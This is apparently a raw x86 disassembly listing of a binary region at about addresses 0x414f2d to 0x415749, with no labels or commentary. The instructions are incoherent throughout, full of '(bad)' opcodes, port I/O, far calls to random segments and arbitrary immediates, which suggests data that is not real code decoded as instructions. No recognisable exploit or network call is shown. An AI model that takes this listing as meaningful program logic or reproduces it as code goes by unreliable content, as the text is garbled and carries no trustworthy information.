  414f2d:	popa   
  414f2e:	jle    0x414f62
  414f30:	or     DWORD PTR [edi+0x1b47df01],edi
  414f36:	dec    ebp
  414f37:	test   DWORD PTR [edx+0x62],0x54704f44
  414f3e:	ins    DWORD PTR es:[edi],dx
  414f3f:	int3   
  414f40:	xlat   BYTE PTR ds:[ebx]
  414f41:	push   0xffffffdb
  414f43:	nop
  414f44:	cmp    ecx,esp
  414f46:	test   eax,0xf658ec71
  414f4b:	pop    ebp
  414f4c:	fiadd  DWORD PTR [ecx+0x4]
  414f4f:	xor    BYTE PTR [ebx],bl
  414f51:	and    BYTE PTR [ecx],bh
  414f53:	aam    0x4a
  414f55:	inc    esi
  414f56:	(bad)  
  414f57:	aas    
  414f58:	dec    edi
  414f59:	ins    BYTE PTR es:[edi],dx
  414f5a:	pop    ebp
  414f5b:	pop    ecx
  414f5c:	fs pop esi
  414f5e:	jp     0x414f23
  414f60:	inc    edx
  414f61:	shl    al,0x9
  414f64:	dec    esp
  414f65:	scas   eax,DWORD PTR es:[edi]
  414f66:	ficom  WORD PTR [edx-0x78]
  414f69:	push   ebp
  414f6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f6b:	mov    dh,0x1d
  414f6d:	mov    al,ds:0x6fb0c777
  414f72:	add    al,0xdb
  414f74:	add    BYTE PTR [edi],dh
  414f76:	and    dh,bl
  414f78:	adc    ch,BYTE PTR [edx]
  414f7a:	imul   esp,DWORD PTR [eax+0x62],0xbdfd3b4
  414f81:	or     DWORD PTR [ebx+0x49ff03fd],ebx
  414f87:	es (bad) 
  414f89:	mov    al,ds:0xf07e6c08
  414f8e:	pop    esi
  414f8f:	jecxz  0x414f4e
  414f91:	push   edi
  414f92:	sbb    BYTE PTR [edi-0x2c82367],ah
  414f98:	push   es
  414f99:	cs loope 0x414f58
  414f9c:	retf   
  414f9d:	lahf   
  414f9e:	in     al,dx
  414f9f:	mov    DWORD PTR [edx+0x76216aa6],ecx
  414fa5:	cmp    edx,eax
  414fa7:	das    
  414fa8:	ret    0x8052
  414fab:	iret   
  414fac:	(bad)  
  414fad:	xchg   esi,eax
  414fae:	jae    0x414f91
  414fb0:	jbe    0x414fae
  414fb2:	xchg   esi,eax
  414fb3:	jns    0x414f3d
  414fb5:	cli    
  414fb6:	mov    ebx,es
  414fb8:	in     eax,0x70
  414fba:	call   0x635:0x1157b0c1
  414fc1:	ins    BYTE PTR es:[edi],dx
  414fc2:	test   BYTE PTR ds:0x3a0a9df1,bl
  414fc8:	fimul  DWORD PTR [ebx]
  414fca:	repz mov edx,0x820719b2
  414fd0:	pop    ss
  414fd1:	sti    
  414fd2:	mov    DWORD PTR [edi-0x223ea3db],esi
  414fd8:	or     BYTE PTR [esp+ebp*8-0x5c],bh
  414fdc:	xchg   ebp,eax
  414fdd:	add    dl,BYTE PTR [eax+0x3ca82ad8]
  414fe3:	sub    DWORD PTR [ecx-0x5e054e08],eax
  414fe9:	ret    
  414fea:	out    dx,al
  414feb:	mov    ebp,0x38f489a1
  414ff0:	cmp    ebx,edx
  414ff2:	in     al,0x59
  414ff4:	das    
  414ff5:	repnz dec ebp
  414ff7:	call   0xddb87e69
  414ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ffd:	sbb    DWORD PTR [ecx+0x2e],edi
  415000:	test   al,dh
  415002:	cmp    al,0x96
  415004:	mov    bh,0x35
  415006:	sub    dh,al
  415008:	not    BYTE PTR [edi+edi*4+0x69]
  41500c:	in     eax,0xf9
  41500e:	xchg   ecx,eax
  41500f:	mov    dh,0x8e
  415011:	and    BYTE PTR [ecx+ebx*4],bl
  415014:	fwait
  415015:	cmp    al,0x14
  415017:	in     eax,dx
  415018:	out    dx,eax
  415019:	fistp  QWORD PTR [ecx]
  41501b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41501c:	jno    0x415087
  41501e:	call   0x61e8:0x6f4ef3e0
  415025:	xor    ebp,DWORD PTR [edi+0x6621f749]
  41502b:	mov    fs,edi
  41502d:	sub    BYTE PTR [edi+0x30],0x4b
  415031:	out    0xeb,eax
  415033:	jg     0x415023
  415035:	mov    edi,0xa5643589
  41503a:	fidiv  WORD PTR ds:0xef304284
  415040:	jne    0x41504b
  415042:	call   0x735c:0xf55d06ad
  415049:	dec    edx
  41504a:	xor    eax,ebx
  41504c:	daa    
  41504d:	(bad)  
  41504e:	test   al,0xec
  415050:	retf   
  415051:	addr16 in al,dx
  415053:	pop    eax
  415054:	jo     0x4150cb
  415056:	lock push esp
  415058:	xchg   esi,eax
  415059:	jmp    0xc225bdd
  41505e:	test   DWORD PTR [edx+0x21],esp
  415061:	mov    al,ds:0x1ca335f3
  415066:	stos   BYTE PTR es:[edi],al
  415067:	pop    esi
  415068:	ss repnz push dx
  41506c:	(bad)  
  41506d:	fidiv  WORD PTR [ecx]
  41506f:	pop    esi
  415070:	mov    al,ds:0x5bb58ce1
  415075:	pusha  
  415076:	add    al,0x27
  415078:	add    al,0x99
  41507a:	push   0xa0b9600b
  41507f:	jae    0x4150c4
  415081:	sbb    ebp,DWORD PTR [ebx+ecx*2+0x45]
  415085:	adc    DWORD PTR [edi],esi
  415087:	dec    ecx
  415088:	pushf  
  415089:	mov    ds:0xfbfe8c8,eax
  41508e:	hlt    
  41508f:	mov    ebx,0x34d51cb7
  415094:	jg     0x4150f3
  415096:	call   0x3fbd7982
  41509b:	sbb    BYTE PTR [esi],0xb
  41509e:	rcl    BYTE PTR [esi],cl
  4150a0:	popa   
  4150a1:	ss enter 0x2147,0x1b
  4150a6:	adc    eax,0x18d6470
  4150ab:	sbb    ch,bh
  4150ad:	js     0x4150a5
  4150af:	sbb    DWORD PTR [ebp+0x49],ebp
  4150b2:	jle    0x41510e
  4150b4:	scas   al,BYTE PTR es:[edi]
  4150b5:	fidivr DWORD PTR [esi]
  4150b7:	adc    al,0x3e
  4150b9:	(bad)  
  4150bb:	shl    BYTE PTR [eax-0x160a2619],cl
  4150c1:	ffree  st(6)
  4150c3:	jg     0x4150bc
  4150c5:	mov    ebx,0x75abfe95
  4150ca:	and    eax,0x45eed775
  4150cf:	fmul   QWORD PTR [edx-0x5a]
  4150d2:	xchg   esp,eax
  4150d3:	or     DWORD PTR [ecx-0x3eabca03],edi
  4150d9:	jb     0x41510f
  4150db:	mov    ah,0xf8
  4150dd:	imul   ebx,DWORD PTR [ecx-0x50a21b58],0x25
  4150e4:	js     0x4150dd
  4150e6:	imul   edx,ecx,0x41
  4150e9:	stos   DWORD PTR es:[edi],eax
  4150ea:	test   al,0x8d
  4150ec:	push   ebp
  4150ed:	sbb    cl,bh
  4150ef:	(bad)  
  4150f0:	call   0xb63cec08
  4150f5:	and    dl,BYTE PTR [edx-0x24]
  4150f8:	out    0x81,eax
  4150fa:	push   ds
  4150fb:	pop    es
  4150fc:	retf   
  4150fd:	mov    bp,0x3db4
  415101:	shr    BYTE PTR [eax+ebx*8-0x19],0xfc
  415106:	pop    esp
  415107:	aam    0x90
  415109:	leave  
  41510a:	cli    
  41510b:	sbb    dh,bh
  41510d:	stos   DWORD PTR es:[edi],eax
  41510e:	adc    BYTE PTR [ebp+0x4c],bl
  415111:	clc    
  415112:	cmp    al,0xdd
  415114:	into   
  415115:	and    eax,0x1e8cb48c
  41511a:	inc    ecx
  41511b:	xchg   ecx,eax
  41511c:	(bad)  
  41511d:	cli    
  41511e:	inc    edi
  41511f:	push   eax
  415120:	xchg   ecx,eax
  415121:	add    ebp,esi
  415123:	bound  esp,QWORD PTR [ebp+0x1b74a923]
  415129:	jae    0x41516a
  41512b:	lock ror BYTE PTR [eax],cl
  41512e:	sub    BYTE PTR [edi],bh
  415130:	retf   0xef95
  415133:	sbb    eax,0xb7f27ec5
  415138:	das    
  415139:	je     0x4151b5
  41513b:	jmp    0x5cdd:0x82835737
  415142:	mov    ds:0xbee34e65,eax
  415147:	loope  0x41514a
  415149:	and    BYTE PTR [ebx-0x77d09b5c],dl
  41514f:	xor    al,0xf
  415151:	out    0xc3,al
  415153:	pop    es
  415154:	or     eax,DWORD PTR [eax]
  415156:	push   ds
  415157:	mov    eax,ds:0x8dc10cd8
  41515c:	(bad)  
  41515d:	mov    ah,0x3b
  41515f:	popa   
  415160:	hlt    
  415161:	int    0x43
  415163:	sbb    DWORD PTR [ecx-0x3a6f00d7],ecx
  415169:	mov    eax,0xed68ed22
  41516e:	mov    ebx,0x1dc7cc67
  415173:	push   ebp
  415174:	pop    ss
  415175:	mov    WORD PTR [esi-0x45],es
  415178:	mov    ecx,0x29604e4d
  41517d:	mov    dh,0x81
  41517f:	add    BYTE PTR [ecx+eax*8],ch
  415182:	shl    DWORD PTR [esi+0x428a566b],1
  415188:	and    DWORD PTR ds:0x7cbbc43c,esp
  41518e:	or     eax,0xd7151a51
  415193:	or     al,0x15
  415195:	in     eax,dx
  415196:	ins    DWORD PTR es:[edi],dx
  415197:	cli    
  415198:	(bad)
  41519d:	loopne 0x4151b1
  41519f:	(bad)  
  4151a0:	jmp    0x5e6b5b12
  4151a5:	out    dx,al
  4151a6:	lds    edi,FWORD PTR [ebx]
  4151a8:	shl    BYTE PTR [ecx-0x41debae5],0x54
  4151af:	repnz mov ah,0xe5
  4151b2:	fcomp  DWORD PTR [ecx]
  4151b4:	stos   DWORD PTR es:[edi],eax
  4151b5:	(bad)  
  4151b6:	dec    edi
  4151b7:	sahf   
  4151b8:	push   0x538e5d67
  4151bd:	daa    
  4151be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151bf:	mov    dh,0xea
  4151c1:	pop    ds
  4151c2:	pop    ss
  4151c3:	stos   BYTE PTR es:[edi],al
  4151c4:	(bad)
  4151c7:	xchg   ecx,eax
  4151c8:	adc    BYTE PTR [ebx+0x30],cl
  4151cb:	cli    
  4151cc:	std    
  4151cd:	test   DWORD PTR [edx],0x2211036f
  4151d3:	or     eax,edi
  4151d5:	fwait
  4151d6:	xor    eax,0xdb66614c
  4151db:	lds    esp,FWORD PTR [esi-0x38]
  4151de:	das    
  4151df:	(bad)  
  4151e0:	ja     0x41516c
  4151e2:	push   ebp
  4151e3:	(bad)  [edi-0x53d236da]
  4151e9:	shr    cl,0xb
  4151ec:	inc    ebx
  4151ed:	dec    eax
  4151ee:	out    0x41,al
  4151f0:	push   0x1f84a5e6
  4151f5:	fiadd  WORD PTR [ecx]
  4151f7:	mov    BYTE PTR [edx-0x28],0xee
  4151fb:	dec    edi
  4151fc:	mov    ds,WORD PTR [eax-0xbfbe00]
  415202:	(bad)  
  415203:	clc    
  415204:	sbb    eax,0x16e21199
  415209:	pop    es
  41520a:	xlat   BYTE PTR ds:[ebx]
  41520b:	daa    
  41520c:	sbb    edi,ecx
  41520e:	in     al,dx
  41520f:	lods   eax,DWORD PTR ds:[esi]
  415210:	hlt    
  415211:	and    eax,0xcfe3224
  415216:	xchg   ebp,eax
  415217:	or     DWORD PTR [esi-0x308104ed],edx
  41521d:	(bad)  
  41521f:	or     BYTE PTR [eax+0x53],dl
  415222:	or     ebp,0x49
  415225:	adc    ecx,edx
  415227:	fld    TBYTE PTR [ecx-0x6ef881a5]
  41522d:	ja     0x41520a
  41522f:	push   eax
  415230:	pop    ebp
  415231:	xchg   ebp,eax
  415232:	mov    BYTE PTR [edi],dl
  415234:	xor    BYTE PTR [ebx-0x33],dl
  415237:	xor    DWORD PTR [esi-0x62619464],0x10
  41523e:	inc    ebp
  41523f:	stos   DWORD PTR es:[edi],eax
  415240:	mov    ss,WORD PTR [edi]
  415242:	cli    
  415243:	pop    ecx
  415244:	mov    ebx,esi
  415246:	scas   al,BYTE PTR es:[edi]
  415247:	arpl   WORD PTR [eax-0xeb8d65c],cx
  41524d:	pop    ecx
  41524e:	inc    eax
  41524f:	and    al,0x5c
  415251:	das    
  415252:	sub    DWORD PTR [ecx*1-0x3d787048],esp
  415259:	adc    eax,0x3f7d2c50
  41525e:	push   esi
  41525f:	popf   
  415260:	mov    DWORD PTR [ecx-0x179521a2],eax
  415266:	les    ecx,FWORD PTR [ebx-0x6398a29a]
  41526c:	mov    ch,0x3a
  41526e:	mov    ebx,0xc86c7317
  415273:	mov    esi,0x37df3301
  415278:	jno    0x41527f
  41527a:	mov    ecx,DWORD PTR cs:[edi+0x29]
  41527e:	(bad)
  415281:	es jl  0x415246
  415284:	test   al,0xff
  415286:	rcr    ebx,1
  415288:	in     al,0xb8
  41528a:	sbb    eax,0x6a09e2d9
  41528f:	stos   BYTE PTR es:[edi],al
  415290:	int3   
  415291:	scas   al,BYTE PTR es:[edi]
  415292:	popa   
  415293:	sahf   
  415294:	sbb    ch,BYTE PTR [edi-0x48]
  415297:	lock jae 0x4152f8
  41529a:	aam    0x55
  41529c:	loopne 0x415303
  41529e:	(bad)  
  4152a0:	fxam   
  4152a2:	in     al,dx
  4152a3:	jns    0x415310
  4152a5:	scas   eax,DWORD PTR es:[edi]
  4152a6:	sub    esp,DWORD PTR [eax]
  4152a8:	imul   esi,ebp,0x10436f
  4152ae:	(bad)  
  4152af:	js     0x4152f5
  4152b1:	inc    ebp
  4152b2:	arpl   WORD PTR [edi+0x9],dx
  4152b5:	mov    al,ds:0xff3f615b
  4152ba:	fwait
  4152bb:	mov    ah,0x42
  4152bd:	jb     0x4152b1
  4152bf:	push   eax
  4152c0:	fmul   QWORD PTR [esi-0x29]
  4152c3:	jae    0x41530f
  4152c5:	sbb    eax,DWORD PTR [ebx]
  4152c7:	out    dx,eax
  4152c8:	push   ebp
  4152c9:	dec    ebx
  4152ca:	ficomp DWORD PTR [edi]
  4152cc:	aad    0x24
  4152ce:	sub    ebx,edi
  4152d0:	adc    ch,ah
  4152d2:	fs je  0x415299
  4152d5:	call   0x3008:0xb84087c9
  4152dc:	imul   ebp,DWORD PTR [edx],0x81db97ac
  4152e2:	test   eax,0x673e9ecc
  4152e7:	jne    0x41533b
  4152e9:	xchg   ecx,eax
  4152ea:	inc    edi
  4152eb:	call   0x30aa:0xee3f58c2
  4152f2:	enter  0x324,0xfd
  4152f6:	in     al,0xb4
  4152f8:	gs xchg ebx,eax
  4152fa:	ss in  eax,0x28
  4152fd:	jg     0x41530e
  4152ff:	push   edx
  415300:	stos   DWORD PTR es:[edi],eax
  415301:	mov    esp,0x8d730e62
  415306:	fstp   QWORD PTR [esi+0x61]
  415309:	sha1msg2 xmm7,XMMWORD PTR [ebx+0x2b]
  41530e:	add    bh,BYTE PTR ds:0xb7a20d12
  415314:	dec    esi
  415315:	jnp    0x41529b
  415317:	out    0x93,eax
  415319:	push   0x297466f0
  41531e:	call   0x4034:0xf3589d99
  415325:	or     al,0x78
  415327:	cld    
  415328:	inc    edx
  415329:	and    al,BYTE PTR [ebp-0x313aed59]
  41532f:	xor    al,0x5b
  415331:	out    dx,al
  415332:	jno    0x415386
  415334:	cld    
  415335:	push   ecx
  415336:	jbe    0x4153a5
  415338:	retf   0x707c
  41533b:	or     eax,0x2f4682da
  415340:	pushf  
  415341:	repz ret 
  415343:	sub    BYTE PTR [ecx+edx*8+0x2c],bh
  415347:	inc    ebp
  415348:	mov    dh,0x31
  41534a:	jb     0x41535d
  41534c:	pop    es
  41534d:	enter  0x2edb,0x2b
  415351:	pop    esi
  415352:	cmc    
  415353:	mov    esi,0x3f21aca6
  415358:	cmp    al,0x2e
  41535a:	rol    esp,0x50
  41535d:	std    
  41535e:	jnp    0x4153b1
  415360:	jmp    0x415379
  415362:	scas   eax,DWORD PTR es:[edi]
  415363:	mov    edx,0x37e7c7ca
  415368:	lahf   
  415369:	mov    edi,0xc3aa29ef
  41536e:	aas    
  41536f:	inc    ecx
  415370:	xor    BYTE PTR [ebp-0x9f9f917],bl
  415376:	push   ebx
  415377:	adc    al,0x8
  415379:	sahf   
  41537a:	into   
  41537b:	scas   eax,DWORD PTR es:[edi]
  41537c:	jo     0x4153ef
  41537e:	adc    eax,0x4f0b07b3
  415383:	cmp    DWORD PTR [ecx-0x4b],esp
  415386:	sbb    DWORD PTR [eax+0x4159c863],eax
  41538c:	xchg   ebp,eax
  41538d:	jl     0x4153b2
  41538f:	rol    DWORD PTR [esi],cl
  415391:	mov    al,0xe3
  415393:	inc    ebp
  415394:	out    0xde,eax
  415396:	mov    ecx,0x6dad6422
  41539b:	jecxz  0x415389
  41539d:	stos   BYTE PTR es:[edi],al
  41539e:	add    BYTE PTR [esi+0x7a68bbb4],0xc7
  4153a5:	mov    ds:0xe31e2dfe,al
  4153aa:	data16 std 
  4153ac:	cwde   
  4153ad:	data16 (bad) 
  4153af:	jae    0x41536b
  4153b1:	push   ebp
  4153b2:	sub    ah,BYTE PTR [ebx+0x1835c7c7]
  4153b8:	jp     0x415404
  4153ba:	adc    eax,0x758b4591
  4153bf:	lahf   
  4153c0:	mov    bl,0x7f
  4153c2:	lock sub edi,ebp
  4153c5:	jae    0x415398
  4153c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153c8:	sub    ch,BYTE PTR [edx+0x72]
  4153cb:	int    0xf1
  4153cd:	ficomp DWORD PTR [esi+esi*2-0x8dc41c2]
  4153d4:	mov    ebp,0x4d40fac2
  4153d9:	aam    0xab
  4153db:	adc    cl,ah
  4153dd:	adc    eax,0x91f9b53e
  4153e2:	mov    ds:0xcc929706,eax
  4153e7:	jo     0x4153ae
  4153e9:	mov    dl,BYTE PTR [ebp+0xf]
  4153ec:	and    DWORD PTR [esi+0x2f],0x121bcba8
  4153f3:	add    al,0x61
  4153f5:	in     eax,0x72
  4153f7:	or     al,0xdd
  4153f9:	adc    al,0x7e
  4153fb:	push   esp
  4153fc:	xchg   ebp,ebx
  4153fe:	retf   
  4153ff:	out    0xb1,al
  415401:	test   BYTE PTR [esp+ecx*8+0x501feb7b],al
  415408:	repz pop ebp
  41540a:	push   cs
  41540b:	fidivr WORD PTR [ebx+0x4161b1d9]
  415411:	loope  0x4153d3
  415413:	inc    esi
  415414:	rol    DWORD PTR [ebx+0x49],0x49
  415418:	mov    ecx,0x48c9e07d
  41541d:	push   eax
  41541e:	xchg   ebx,eax
  41541f:	push   ds
  415420:	and    DWORD PTR [esi],eax
  415422:	repnz push edx
  415424:	cli    
  415425:	mov    esp,0xcbb10119
  41542a:	push   cs
  41542b:	cmp    al,0xc0
  41542d:	mov    ebp,0x36fb3a05
  415432:	sub    al,0xe1
  415434:	jl     0x4153db
  415436:	or     eax,0xb8fff990
  41543b:	lds    edi,FWORD PTR [ebx]
  41543d:	xchg   ebx,eax
  41543e:	xchg   esi,eax
  41543f:	out    0xa2,eax
  415441:	test   al,0x20
  415443:	add    eax,0x4111df59
  415448:	scas   al,BYTE PTR es:[edi]
  415449:	in     al,dx
  41544a:	adc    al,0x2a
  41544c:	imul   eax,ebx,0xffffff92
  41544f:	sub    eax,0x63498e66
  415454:	jne    0x4154c1
  415456:	js     0x4154b0
  415458:	cmp    esp,DWORD PTR [ebp+0x2f]
  41545b:	out    0xc4,eax
  41545d:	sub    al,BYTE PTR [eax]
  41545f:	test   al,0xc
  415461:	mov    bh,0xb8
  415463:	jle    0x4154de
  415465:	inc    eax
  415466:	mov    ebp,0x93bbce6c
  41546b:	test   DWORD PTR [edi+0x36],edx
  41546e:	jge    0x41541b
  415470:	jge    0x415424
  415472:	and    BYTE PTR [ebp+0x3a8d856b],bh
  415478:	jle    0x415432
  41547a:	fwait
  41547b:	add    DWORD PTR [edx],ecx
  41547d:	repz adc DWORD PTR [edx-0x58dc13e4],esi
  415484:	std    
  415485:	dec    ebx
  415486:	repz pop ds
  415488:	inc    ebx
  415489:	mov    ecx,0xc940535
  41548e:	loope  0x415443
  415490:	and    eax,0x99f255b5
  415495:	int    0x44
  415497:	stos   BYTE PTR es:[edi],al
  415498:	mov    esp,0x17ba2ba0
  41549d:	stc    
  41549e:	out    0xbf,al
  4154a0:	adc    al,0x82
  4154a2:	xor    edi,DWORD PTR [esp+ebp*8-0x79]
  4154a6:	mov    ds:0x58516af0,al
  4154ab:	mov    ebp,0x5c7315f8
  4154b0:	mov    bl,0x3b
  4154b2:	pop    ebp
  4154b3:	dec    ebp
  4154b4:	jmp    0x4154e7
  4154b6:	adc    dl,BYTE PTR [edx]
  4154b8:	js     0x41551b
  4154ba:	mov    esp,0x85a3d7bf
  4154bf:	idiv   BYTE PTR [esi]
  4154c1:	mov    ch,dl
  4154c3:	imul   bh
  4154c5:	call   0x2ddb:0x5429641f
  4154cc:	cmp    edi,DWORD PTR [edx]
  4154ce:	push   es
  4154cf:	or     DWORD PTR [eax],eax
  4154d1:	sub    BYTE PTR [ecx-0x79],0x3c
  4154d5:	rcr    bh,cl
  4154d7:	mov    WORD PTR [eax-0x54960d6a],ds
  4154dd:	inc    esi
  4154de:	cmp    ecx,DWORD PTR [ecx+0x990c46c]
  4154e4:	jmp    0x2903f462
  4154e9:	ins    DWORD PTR es:[edi],dx
  4154ea:	push   ebx
  4154eb:	or     bl,BYTE PTR [ecx]
  4154ed:	mov    ah,0x86
  4154ef:	xor    al,0xa7
  4154f1:	cdq    
  4154f2:	xlat   BYTE PTR ds:[ebx]
  4154f3:	in     al,dx
  4154f4:	mov    esp,0xa5875cb
  4154f9:	in     al,0x7
  4154fb:	stos   BYTE PTR es:[edi],al
  4154fc:	outs   dx,DWORD PTR ds:[esi]
  4154fd:	js     0x41557b
  4154ff:	int    0x6c
  415501:	mov    dl,0x94
  415503:	bound  esp,QWORD PTR [edi-0x51]
  415506:	add    bh,BYTE PTR [ecx+0x5]
  415509:	ret    
  41550a:	stc    
  41550b:	pop    ds
  41550c:	jge    0x4154da
  41550e:	stc    
  41550f:	js     0x415547
  415511:	push   ds
  415512:	pusha  
  415513:	mov    dh,0x82
  415515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415516:	das    
  415517:	mov    ebp,0x5ac0966e
  41551c:	out    dx,al
  41551d:	xor    esi,DWORD PTR ds:0xef52ecd5
  415523:	mov    bh,0x3b
  415525:	(bad)  
  415526:	fyl2xp1 
  415528:	shl    ah,cl
  41552a:	inc    edx
  41552b:	in     eax,dx
  41552c:	cwde   
  41552d:	iret   
  41552e:	fwait
  41552f:	mov    edi,DWORD PTR [ecx-0x36]
  415532:	jl     0x415586
  415534:	dec    ebp
  415535:	retf   0x6e32
  415538:	stos   BYTE PTR es:[edi],al
  415539:	(bad)  
  41553a:	jl     0x4154ea
  41553c:	enter  0x83b0,0x4
  415540:	pop    ds
  415541:	in     al,0xe5
  415543:	and    ah,BYTE PTR [ebp+0x5c]
  415546:	inc    edx
  415547:	sub    dl,ch
  415549:	imul   edx,DWORD PTR [ecx-0x72fb6dd7],0xa2c2e729
  415553:	retf   
  415554:	xchg   ebp,ebx
  415556:	and    dh,cl
  415558:	add    DWORD PTR [esi-0x426b37b4],ecx
  41555e:	sub    BYTE PTR [eax+0x75],cl
  415561:	jge    0x4155c9
  415563:	ja     0x4155a2
  415565:	push   ebp
  415566:	adc    dh,BYTE PTR [esi+0x1a0b2f61]
  41556c:	repz xor ah,ah
  41556f:	fcomp  DWORD PTR [eax+0x304ea270]
  415575:	inc    ebx
  415576:	sbb    ch,BYTE PTR [edx-0x463f2ad1]
  41557c:	add    BYTE PTR [esi+ebx*2-0x62],0xa5
  415581:	call   0xd73:0xd3c03111
  415588:	je     0x415565
  41558a:	jg     0x4155d8
  41558c:	jne    0x41559c
  41558e:	test   eax,0xc9fb708
  415593:	pop    es
  415594:	push   ebp
  415595:	call   0x28a7:0xc55d6664
  41559c:	push   esp
  41559d:	or     al,0xf2
  41559f:	dec    ebp
  4155a0:	xchg   ebp,eax
  4155a1:	push   ecx
  4155a2:	aad    0x35
  4155a4:	mov    ds:0x90cb3ba7,al
  4155a9:	sbb    eax,0xefdc1bf9
  4155ae:	ret    
  4155af:	cmp    eax,DWORD PTR ds:0xaf873f64
  4155b5:	outs   dx,DWORD PTR ds:[esi]
  4155b6:	xchg   ebp,eax
  4155b7:	and    al,0x75
  4155b9:	dec    eax
  4155ba:	add    dl,BYTE PTR [edx]
  4155bc:	in     eax,0xdd
  4155be:	enter  0x5b71,0xa2
  4155c2:	into   
  4155c3:	jbe    0x415587
  4155c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155c6:	add    al,0x75
  4155c8:	cvtpi2ps xmm0,QWORD PTR [eax-0x26]
  4155cc:	jbe    0x415603
  4155ce:	pushf  
  4155cf:	in     eax,0x96
  4155d1:	or     al,0x47
  4155d3:	or     bh,BYTE PTR [esi+0x0]
  4155d6:	js     0x41555e
  4155d8:	fsubr  st(0),st
  4155da:	sbb    DWORD PTR ds:0xa7fb4ce5,ebp
  4155e0:	aas    
  4155e1:	xlat   BYTE PTR ds:[ebx]
  4155e2:	lahf   
  4155e3:	enter  0xf11b,0x3f
  4155e7:	sub    DWORD PTR [esi-0x51a5f953],ebp
  4155ed:	mov    al,ds:0x7c1c5e9e
  4155f2:	xchg   edi,eax
  4155f3:	or     dl,BYTE PTR [eax]
  4155f5:	(bad)  
  4155f6:	mov    ebx,0x65363225
  4155fb:	jb     0x415645
  4155fd:	xor    eax,0xbf46a144
  415602:	mov    al,ds:0x48f57368
  415607:	lds    eax,FWORD PTR [ebx-0x174b0414]
  41560d:	add    dl,BYTE PTR [esi-0x3139952d]
  415613:	lods   eax,DWORD PTR ds:[esi]
  415614:	push   edx
  415615:	daa    
  415616:	dec    edx
  415617:	daa    
  415618:	mov    bh,0x73
  41561a:	mov    ebx,0xec160a58
  41561f:	(bad)  
  415621:	add    BYTE PTR [eax],cl
  415623:	sub    BYTE PTR [edi],dh
  415625:	jnp    0x41568b
  415627:	test   eax,0x390ffdeb
  41562c:	and    BYTE PTR [ecx-0x46],bh
  41562f:	inc    esi
  415630:	xor    al,0x95
  415632:	lods   al,BYTE PTR ds:[esi]
  415633:	xor    ah,BYTE PTR ds:0x8d426b69
  415639:	rcl    BYTE PTR [edi+0x46],0x77
  41563d:	or     DWORD PTR [eax+0x44763e19],edx
  415643:	push   eax
  415644:	test   BYTE PTR [edi+0x48],ch
  415647:	dec    eax
  415648:	enter  0x3790,0x38
  41564c:	repz dec ecx
  41564e:	jl     0x415609
  415650:	pop    ss
  415651:	mov    ah,BYTE PTR [edx+0x138c1de8]
  415657:	or     al,0x82
  415659:	enter  0xb1cf,0x85
  41565d:	rol    dh,0x3c
  415660:	jne    0x4156ae
  415662:	lds    ebx,FWORD PTR [eax-0x27]
  415665:	int3   
  415666:	add    al,0x19
  415668:	and    eax,0xefd6cb3b
  41566d:	jb     0x415690
  41566f:	les    edx,FWORD PTR [edi]
  415671:	outs   dx,BYTE PTR ds:[esi]
  415672:	add    BYTE PTR ds:0x4e0295ba,dl
  415678:	scas   eax,DWORD PTR es:[edi]
  415679:	popf   
  41567a:	sub    eax,0x64b8de3f
  41567f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415680:	out    0x74,eax
  415682:	pop    ss
  415683:	add    eax,0xd6f88cd9
  415688:	sub    al,0xd2
  41568a:	mov    esi,0xd66c115b
  41568f:	into   
  415690:	dec    ebp
  415691:	add    eax,ebx
  415693:	cmp    eax,DWORD PTR [eax-0x5fdaac11]
  415699:	cli    
  41569a:	imul   esi,eax,0x1404375c
  4156a0:	iret   
  4156a1:	xor    DWORD PTR [eax+0x27],edi
  4156a4:	push   es
  4156a5:	jo     0x4156e8
  4156a7:	outs   dx,DWORD PTR ds:[esi]
  4156a8:	ins    DWORD PTR es:[edi],dx
  4156a9:	mov    eax,ds:0xc45d7045
  4156ae:	ja     0x41564c
  4156b0:	jle    0x4156ce
  4156b2:	xor    al,0x5b
  4156b4:	call   0x57ca:0xf02fa8b3
  4156bb:	outs   dx,BYTE PTR ds:[esi]
  4156bc:	dec    eax
  4156bd:	ins    DWORD PTR es:[edi],dx
  4156be:	rol    BYTE PTR [ebx-0x1f93283],1
  4156c4:	clc    
  4156c5:	in     al,dx
  4156c6:	std    
  4156c7:	fs mov bh,0x71
  4156ca:	in     al,dx
  4156cb:	out    dx,eax
  4156cc:	imul   edi,DWORD PTR [esp+eax*8+0x3],0x66
  4156d1:	and    ebp,esi
  4156d3:	push   edi
  4156d4:	lods   eax,DWORD PTR ds:[esi]
  4156d5:	jmp    0x4156f1
  4156d7:	push   0x23c8d5ce
  4156dc:	xchg   ebx,eax
  4156dd:	stc    
  4156de:	xchg   edx,eax
  4156df:	mov    edi,0x6ac15a41
  4156e4:	sbb    DWORD PTR [ebp-0x4a],eax
  4156e7:	pushf  
  4156e8:	paddq  mm6,QWORD PTR [esi-0x4f]
  4156ec:	push   0xffffff9a
  4156ee:	int3   
  4156ef:	ja     0x415766
  4156f1:	(bad)  
  4156f2:	popf   
  4156f3:	retf   
  4156f4:	fst    DWORD PTR [ecx+esi*8+0x4452e54e]
  4156fb:	adc    ebx,edi
  4156fd:	ja     0x415698
  4156ff:	dec    ecx
  415700:	sub    BYTE PTR [edx],0x7a
  415703:	and    eax,0xa8e8e5f1
  415708:	seta   BYTE PTR [edi+esi*1-0x211b128b]
  415710:	daa    
  415711:	jo     0x4156cb
  415713:	loop   0x4156ac
  415715:	push   0xd5dfbe45
  41571a:	ret    0xa64c
  41571d:	push   ss
  41571e:	fild   QWORD PTR [esi+0x628f30be]
  415724:	mov    edx,0xb34b9b43
  415729:	shl    cl,0xaa
  41572c:	lods   eax,DWORD PTR ds:[esi]
  41572d:	clc    
  41572e:	in     al,dx
  41572f:	xor    BYTE PTR [eax+0x5a],bh
  415732:	pop    esi
  415733:	adc    eax,0x6f849dbf
  415738:	pop    ecx
  415739:	jno    0x4156ce
  41573b:	mov    bh,0x66
  41573d:	cmp    eax,0x2e0c4432
  415742:	mov    ch,0x5c
  415744:	sub    eax,0xbc3bc303
  415749:	rol    DWORD PTR [edi+0x14],0xc9
